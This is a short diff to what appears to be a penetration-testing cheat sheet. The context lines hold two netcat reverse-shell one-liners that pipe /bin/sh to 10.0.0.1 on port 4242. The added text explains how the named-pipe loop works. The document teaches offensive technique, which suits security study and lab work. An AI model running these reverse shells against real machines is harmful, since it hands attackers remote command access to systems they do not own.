@@ -108,6 +108,8 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
+Both of these will create a pipe /tmp/f and continuously read from it with cat. This continuous read output will be piped to /bin/sh. 2>&1 means that stderr will be piped to stdout. stdout from the shell will then be piped to us through netcat. Our inputs through netcat will then be piped back to /tmp/f, thus forming a loop.
+
 ### Spawning a Stable Shell
 > This requires that you already have a reverse shell on the target machine
 
